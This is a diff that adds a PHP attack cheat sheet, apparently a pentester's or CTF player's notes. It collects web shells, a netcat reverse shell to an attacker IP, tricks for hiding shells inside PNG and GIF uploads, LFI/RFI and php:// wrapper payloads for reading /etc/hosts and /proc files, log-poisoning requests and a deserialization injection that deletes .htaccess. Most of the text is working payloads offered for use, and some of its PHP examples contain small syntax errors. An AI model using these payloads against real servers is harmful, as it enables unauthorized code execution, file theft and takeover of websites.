@@ -1,0 +1,414 @@
+PHP Vulnerabilities:(LFI/RFI/SHELL/WRAPPERS/CODE INJECTION/Deserialization)
+===================
+PHP Basics:
+	phpinfo.php:
+		Its the config file for PHP based WebApps
+		Its code:
+			<?php phpinfo(); ?> 
+PHP Reverse Shells:
+	Understanding PHP Shells:
+		Syntax:
+			<?php <echo*> <function<method>>; ?>
+		Examples:	
+			<?php echo shell_exec($_REQUEST["cmd"]);?>
+			<?php system($_REQUEST['cmd']);?>
+		Function:
+			To execute a programs such as nc.exe:
+				1.exec() => It only returns the last line of the generated output, so we need to get creative like this:
+					<?php exec("ls -la",$array); print_r($array); ?>
+				2.shell_exec() => it returns the full output of the command
+				3.passthru() => Its similiar to exec(), but it passes output iraw data format(binary data)
+			To execute commands such as whoami:
+				4.system() => Its for executing system commands only and displaying their output. It means system() cannot execute nc.exe or any program.	
+					system() gives arguments directly to cmd.exe
+					system('dir') => same as cmd.exe /c dir 
+			To read files:
+				5.file_get_contents() => reads a file into a string
+		Method:
+			$_GET[var] => GET verb
+			$_POST[var] => POST verb
+			$_REQUEST[var] => both POST and GET
+			$_COOKIE[var] => cookie field
+	Common PHP Reverse Shells to use:
+		1. Pentest Monkey PHP Reverse Shell:
+			github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php => linux php shell
+			avaiable in kali as /usr/share/laudanum/php/php-reverse-shell.php 
+		2. Basic Shell which takes command as a param:
+			<?php
+				echo shell_exec($_GET['cmd']);
+			?>
+			Usage:
+				/shell.php?cmd=ifconfig
+		3. Basic shell to execute a pre-defined command:
+			<?php
+				echo shell_exec($_GET["dir"]);
+			?>	
+		4. php shell using nc:
+			put nc.exe on website
+			<?php 
+				echo shell_exec('nc.exe 10.10.16.32 4444 -e cmd.exe'); 
+			?>	
+		Note:
+			we can either upload shells or use them via RFI
+	Bypassing the Upload checks:
+		Trying different file extensions:
+			.txt
+			.php
+			.php3
+			.php4
+			.php5
+			.php7
+			.phtml
+			.inc
+			Note:
+				Use burp intruder to see which one of the above are allowed.
+		Uploading php shell as a PNG Image:
+			Use Burp:(used in HTB::popcorn)
+				First upload a png image
+				Then, upload shell.php
+				Go to HTTP-History and see both requests and make the changes as follows:
+					1. Content-Type: image/png
+					2. Copy some on the png data and paste in front of php shell content in http request
+					3. Chnage file-name to shell.png.php
+			PHP code injection in PNG-1:
+				echo '<?php' >> x.png
+				echo 'echo shell_exec($_GET['cmd']);' >> x.png
+				echo '?>' >> x.png
+				rename to x.php.png
+			PHP code injection in PNG-2:
+				you might have to append the first hundred line of a png/jpeg file to a php reverse shell payload, so as to change its signature from a php file to a png file.
+					head -n100 image.png > payload.png
+					msfvenom_payload.php >> payload.png
+			using GIF89Aa; header:
+				GIF89a;
+				<?
+					shell_exec($_GET['cmd']);
+				?>				
+			using exiftool:
+				we can also use “exiftool” as well to append a comment or so to bypass the verification
+					exiftool -Comment='<?php system($_GET['cmd']); ?>' image.png
+					mv image.png image.php.png
+				used in HTB::Magic,HTB::networked
+			Note:
+				both shell.png.php and shell.php.png can work.
+PHP File Inclusion:
+	php.ini:
+		Its a configuration file which can help us to know more about availabel LFI vulnerability in the webapp
+		Example => https://miro.medium.com/max/631/1*ux6Vxbm8uD1YkTJeJwBjsg.png
+		open_basedir = On:
+			if this is on, PHP can't access any file outside the specified directory
+	Understanding Backend Code for File Inclusion:
+		Syntax:
+			Function(Method[variable]):
+			Example-1:
+				include($_GET['page']);
+				include($_COOKIE['lang']);
+			Example-2:
+				$file = $_GET['page'];
+				require($file);	
+		Functions for File Inclusions:(it executes command)
+			include():
+				include() also executes any PHP code in the included file on the server side.
+			require():
+				require() is similar to include() but When a file is included with the include() and PHP cannot find or load it properly, then the include() generates a warning but the script continues to execute!
+			require_once():
+				require_once() is used to access data of another page into our page but only once.The only difference between require and require_once is that, if it is found that the file has already been included in the page, then the calling script is going to ignore further inclusions.
+		Methods:(it takes command from user to pass to system)
+			It takes command from user to pass to system
+			$_GET[var] => GET verb
+			$_POST[var] => POST verb
+			$_REQUEST[var] => both POST and GET
+			$_COOKIE[var] => cookie field
+	Directory Traversal vs File Inclusion:
+		In Directory Traversal, we see the files
+			Note: Directory Traversal is covered in another sheet 
+		In File Inclusion, files get executed
+	LFI:
+		we can see files hosted on server and also execute them.(code execution)
+		Exploitation:
+			to confirm LFI:
+				?file=<payload>	
+					payloads:
+						../../../etc/hosts
+						../../.././././././etc/hosts 
+						../../../../../../../../etc/hosts => we added a lot ../ and had same results as once we reach root directory, "../" has no effect.
+						../../..///////etc/hosts
+						Explanation:
+							../ => go back one directory
+							./ => stay in same directory
+							/ => ignored
+							by default, we apply atleast 3 levels directories
+								reason:
+									webite directory => /vr/www/html
+									so, to get out of it we use ../../../
+							Note:
+								Linux Server => we use /etc/hosts as this file is visible to everyone
+								Windows Server => C:\boot.ini
+					Special Linux Files:
+						/proc directory contains proccess information
+						/proc/self => directory refering to current process
+						/proc/self/environ => shows enivroment variables
+						/proc/self/stat => current process ID
+						/proc/self/fd/# => bruteforcing # from range 3-100 will read any open files by victim.
+							We can bruteforce # using Burp Intruder
+					We can also read session keys:
+						/var/lib/php/session
+						google "where are session keys stored for name_of_web_app" 
+			LFI via phpinfo.php:(HTB:Poison)
+				phpinfo.php is the config file for PHP based WebApps
+				if "file_uploads:on", then phpinfo.php is vuln to LFI
+					it allows us to upload a temp file to server, however we dont know where that file will be uploaded and under what name it will be. so, instead of making a file, we use a prebuilt exploit:
+						github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py
+							edit it as follows:
+								1.PAYLOAD = """ %s \r 
+								--paste code of php-reverse-shell by petestmonkey--
+								2.LFIREQ = """ GET /abcd.php?efgh=%s
+									remove %00%00 from front of %s
+								3. [tmp_name] =&gt
+							./explot.py vitcim_ip 80 <no of threads>
+								no of threads = 100
+							nc -nvlp 4444 => we get a shell
+			LFI via PHP Wrappers:
+				Reading backend files:
+				?s=php://filter/convert.base64-encode/resource=abcd.php
+					it is mostly used in LFI, as if we want to see a code of a .php file hosted on victim, we wouldnt be able to see it normally as php gets executed automatically.
+					it will give a base64 encoded string of content of 'abcd.php'
+				?s=php://filter/read=string.rot13/resource=abcd.php
+				?s=php://filter/convert.iconv.utf-8.utf-16/resource=file.php
+				?s=file:// => Accessing local filesystem	
+			Filter Evasion:
+				Sometimes, webapp only allow to include files having some specific extension:
+					Appending .php after filename:
+						$file = $_GET['page'];
+						require($file . ".php"); # it will add .php after every file
+						Issue:
+							we may get issue bcoz of appeneded .ext, so:
+								works in PHP version < 5.3 only:
+									%00 => null byte #after a null byte nothing gets executed
+									?file=/etc/passwd%00.php
+				Somtimes, webapp automatically appened .php or .ext:
+					backend logic:
+						<?php include($_GET['file'] . '.html'); ?>
+					Bypass:(works in PHP version < 5.3)
+						%00 => null byte #after a null byte nothing gets executed
+						?file=/etc/passwd%00					
+				Sometimes, '/' is blacklisted:
+					/ can be written as %2F (F => captial)
+					../ => ..%2F
+	RFI:
+		Basics:
+			It has 2 requirements:
+				It should have the same Functions and Methods as of LFI
+				In /etc/php5/cgi/php.ini
+					"allow_url_fopen":"on"
+					"allow_url_include":"on"
+		Exploitation:
+			Testing RFI:
+				site.com/page.php?page=http://127.0.0.1 => it will show site.com
+					Its the best way to test RFI as a firewall may block all http outgoing connections, but it wont block itself(127.0.0.1)
+			Here, we host a malicious .php file on our server and include it on victim's site or vulnerable page and get shell:
+				?file=http://my_ip/file
+				?file=ftp://my_ip/file
+			Bypassing Firewall:
+				Using smb instead of http:
+					?file=\\my_ip\abcd\shell.php
+				Using php wrappers:
+					data wrapper:	
+						?file=data:text/plain,<?php echo shell_exec("dir"); ?> 
+						?file=data:text/plain;base64,base64_of_php_code
+					?file=php://
+PHP Wrappers:
+	zlib:// => Compression Streams
+	data:// => Data (RFC 2397)
+	glob:// => Find pathnames matching pattern
+	ssh2:// => Secure Shell 2
+	rar:// => RAR
+	ogg:// => Audio streams
+	phar:// => deserialization
+	expect:// => Process Interaction Streams
+		?s=expect://ls
+	RFI:
+		?s=http://ip/file
+			used to access file via HTTP 
+		?s=ftp://ip/file
+			used to access file via FTP
+		?s=data://
+	LFI:
+		?s=php://filter/convert.base64-encode/resource=abcd.php
+			it is mostly used in LFI, as if we want to see a code of a .php file hosted on victim, we wouldnt be able to see it normally as php gets executed automatically.
+			it will give a base64 encoded string of content of 'abcd.php'
+		?s=php://filter/read=string.rot13/resource=abcd.php
+		?s=php://filter/convert.iconv.utf-8.utf-16/resource=file.php
+		?s=file:// => Accessing local filesystem
+	Using PHP wrappers to get a shell:
+		?file=data:text/plain,<?php echo shell_exec("dir"); ?> 
+PHP Code Injection:
+	Getting shell via Log Poisoning:
+		Requirements:
+			1. Should know location of log files(access.log and error.log) and have permissions to read it
+		Exploitation:	
+			Inserting php-code into the log file:
+				1.we add code into error-log by making request to a page that doesn't exists:
+					nc 192.168.1.102 80
+						GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
+						Host: 192.168.1.102
+						Connection: close
+				2.in referer header:
+					nc 192.168.1.102 80
+						GET / HTTP/1.1
+						Referer: <? passthru($_GET[cmd]) ?>
+						Host: 192.168.1.159
+						Connection: close
+				3. As a request:
+					nc 192.168.1.102 80
+						<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+				4. Visit the following URL:
+					http://ip/vulnerabilities/fi/<?PHP echo system($_GET[‘cmd’])?>
+			Getting the shell:
+				?page=/var/log/apache2/access.log&cmd=id
+				?page=/var/log/apache2/error.log&cmd=id
+	Code Injection in /proc/self/environ:
+		https://www.youtube.com/watch?v=ttTVNcPnsJY
+		https://www.exploit-db.com/papers/12992
+PHP Deserialization and Object Injection:
+	PHP Classes and Objects:
+		<? php
+			class user
+			{
+				public $var = 'hi'
+				public function func($age)
+				{
+					echo $this->var.' i am '.$this->age.' years old'
+				}
+				
+			}
+			$obj = new user();
+			$obj->age = 20;
+			$obj->func();
+		?>
+	Magic Functions:
+		these are those functions which exist by deafult and can be edited by user, these functions are associated with Objects. Every object has its own set of Magic Functions.
+		__construct => constructs an object, it is invoked when an object is created
+		__destruct => destructs an object, it is invoked after the last statement of a particular object
+		__tostring => it is invoked when an object is used as a string, example: 'echo $obj'
+		__sleep => it is invoked when an object is serialized, i.e. when 'serialize' function is used
+		__wakeup => it is invoked when an object is unserialized, i.e. when 'unserialize' function is used
+	serialize and unserialize:
+		serialize => in-built function used to serialize an object.
+		unserialize => in-built function used to unserialize an object.
+		Example of serialized object:
+			o:4:"user":2:{s:8:"username";S:4:"jhon";s:3:"age";n:20;}
+			object:length_of_class_name:class_name:variables_in_class:details
+			o => object
+			s => string
+			b => boolean
+			n => number
+	serialization:
+		<?php
+			class user
+			{
+				public $age = 0;
+				public $name = '';
+				public function PrintData()
+				{
+					echo $this->name.$this->age;
+				}
+				public function __construct()
+				{
+					echo 'constructing <br />';
+				}
+				public function __destruct()
+				{
+					echo 'destructing <br />';
+				}
+				public function __sleep();
+				{
+					echo 'serializing <br />';
+				}
+			}
+			$obj = new user();
+			$obj->age = 20;
+			$obj->name = 'jhon';
+			$obj->PrintData(); //output => jhon20
+			echo serialize($obj) //give serialized object
+		?>
+		OUTPUT:
+			constructing
+			jhon20
+			serializing
+			destructing
+	Unserialization:
+		<?php
+			class user
+			{
+				public $age = 0;
+				public $name = '';
+				public function PrintData()
+				{
+					echo $this->name.$this->age;
+				}
+				public function __construct()
+				{
+					echo 'constructing <br />';
+				}
+				public function __destruct()
+				{
+					echo 'destructing <br />';
+				}
+				public function __wakeup();
+				{
+					echo 'deserializing <br />';		
+			}
+			$obj = unserialize('serialized_string');
+			$obj->PrintData(); //output => jhon20
+		?>	
+		OUTPUT:
+			constructing
+			deserializing
+			jhon20
+			destructing
+	vulnerability:
+		logfile.php
+			<?php
+				class logfile
+				{
+					public $filename = 'error.log';
+					public function logdata($text)
+					{
+						file_put_contents($this->filename,$text,FILE_APPEND);
+					}
+					public  function __destruct()
+					{
+						unlink(dirname(__FILE__).'/'.$this->filename);
+					}
+				}
+			?>
+		script.php
+			<?php
+				include 'logfile.php';
+				//some code
+				class user
+				{
+					public $age=0;
+					public function PrintData()
+					{
+						echo $this->age;
+					}
+				}
+				//some code
+				$usr = unserialize($_GET['usr_serialized']);
+			?>
+			it wokred like:
+				someting.com/script.php?usr_serialized=o:4:"user"........
+		Now, if we try to pass a logfile object to parameter
+			to get logfile object:
+				<?php
+					include 'logfile.php'
+					$obj = new logfile();
+					$obj->filename = '.htaccess';
+					echo serialize($obj).'<br />';
+				?>
+				it will give serialized object of logfile object
+		passing it in parameter:
+			someting.com/script.php?usr_serialized=o:7:"logfile"........
+				boom
